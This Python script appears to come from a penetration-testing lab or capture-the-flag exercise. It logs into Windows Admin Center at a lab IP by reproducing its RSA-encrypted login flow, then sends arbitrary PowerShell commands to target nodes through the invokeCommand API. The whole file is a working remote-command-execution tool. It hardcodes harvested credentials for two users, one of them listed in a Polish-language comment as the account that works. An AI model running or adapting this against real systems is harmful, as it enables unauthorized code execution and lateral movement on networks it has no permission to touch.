#!/usr/bin/env python3
"""Run a PowerShell one-liner via WAC as given user (default noah.b)."""
import argparse, sys, json, base64, re, requests, urllib3
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
urllib3.disable_warnings()

def b64url_decode(s):
    s = s.replace('-','+').replace('_','/')
    return base64.b64decode(s + '='*((4-len(s)%4)%4))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('-u','--user', default='noah.b')
    ap.add_argument('-p','--password', default='RiverDragon#Storm25')
    ap.add_argument('-c','--cmd', default='whoami')
    ap.add_argument('--base', default='https://10.129.6.118:6600')
    ap.add_argument('--node', default='localhost', help='localhost | dc | FQDN')
    args = ap.parse_args()

    s = requests.Session(); s.verify=False
    r = s.get(args.base+'/', timeout=20)
    csrf = re.search(r'id="csrf"[^>]*value="([^"]+)"', r.text).group(1)
    jwk = s.post(args.base+'/api/user/key', json={'csrf':csrf}, timeout=15).json()['jwk']
    n = int.from_bytes(b64url_decode(jwk['n']),'big')
    e = int.from_bytes(b64url_decode(jwk['e']),'big')
    pub = RSAPublicNumbers(e,n).public_key(default_backend())
    data = json.dumps({'username':args.user,'password':args.password,'csrf':csrf}, separators=(',',':'))
    packet = base64.b64encode(pub.encrypt(
        data.encode(),
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )).decode()
    lr = s.post(args.base+'/api/user/login', json={'packet':packet,'csrf':csrf}, timeout=20)
    print('login', lr.status_code)
    if lr.status_code != 200:
        print(lr.text); sys.exit(1)
    headers = {
        'X-XSRF-TOKEN': s.cookies.get('XSRF-TOKEN'),
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }
    body = {'properties': {'script': args.cmd, 'command': None, 'module': None, 'state': 'ready'}}
    url = f'{args.base}/api/nodes/{args.node}/features/powershellApi/invokeCommand'
    rr = s.post(url, headers=headers, json=body, timeout=120)
    print('status', rr.status_code)
    try:
        j = rr.json()
    except Exception:
        print(rr.text); sys.exit(1)
    print(json.dumps(j, indent=2)[:4000])
    if j.get('results'):
        print('--- RESULTS ---')
        for line in j['results']:
            print(line)
    if rr.status_code == 403:
        print('\n[!] Access Denied — ten user nie ma WinRM/PS remoting na nodzie (np. noah).')
        print('    Działa: anderson.w / R3dT3am@Acc3ss#01')
        sys.exit(2)

if __name__ == '__main__':
    main()
